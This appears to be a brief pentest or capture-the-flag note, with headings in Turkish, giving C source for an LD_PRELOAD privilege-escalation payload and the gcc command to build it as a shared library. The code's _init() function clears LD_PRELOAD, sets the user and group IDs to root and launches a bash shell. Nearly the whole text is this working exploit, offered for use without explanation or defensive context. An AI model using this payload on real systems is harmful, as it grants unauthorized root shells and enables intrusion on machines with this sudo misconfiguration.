dosya oluşturma
```bash
exploit.c
```

exploit.c içeriği
``` bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
compile for:
```bash
gcc exploit.c -o exploit -fPIC -shared -nostartfiles -w
```

